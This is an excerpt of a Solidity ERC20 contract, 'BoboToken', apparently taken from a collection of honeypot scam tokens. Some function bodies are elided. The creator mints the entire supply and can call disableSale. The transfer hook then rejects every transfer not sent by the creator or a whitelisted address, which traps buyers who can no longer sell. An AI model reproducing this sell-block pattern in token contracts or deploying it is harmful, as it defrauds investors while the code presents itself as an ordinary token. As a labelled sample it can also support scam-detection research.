...
// File: contracts/hp_wl_by1user/bobo.sol
...
contract BoboToken is ERC20, ERC20Burnable, Pausable, Ownable {
    address public creator;
    bool public saleEnabled = true;
    mapping(address => bool) public whitelist;

    constructor() ERC20("Bobo Token", "BOBO") {
        _mint(msg.sender, 690000000000 * 10 ** decimals());
        creator = msg.sender;
    }

    modifier onlyCreatorOrSaleEnabled() {
        require(msg.sender == creator || saleEnabled || whitelist[msg.sender], "Token sale is not allowed");
        _;
    }
    ...
    function enableSale() public onlyCreator {
        saleEnabled = true;
    }

    function disableSale() public onlyCreator {
        saleEnabled = false;
    }

    function addToWhitelist(address user) public onlyCreator {
        whitelist[user] = true;
    }

    function removeFromWhitelist(address user) public onlyCreator {
    ...
    function _beforeTokenTransfer(address from, address to, uint256 amount)
        ...
        override
    {
        require(from == creator || saleEnabled || whitelist[from], "Token sale is not allowed");
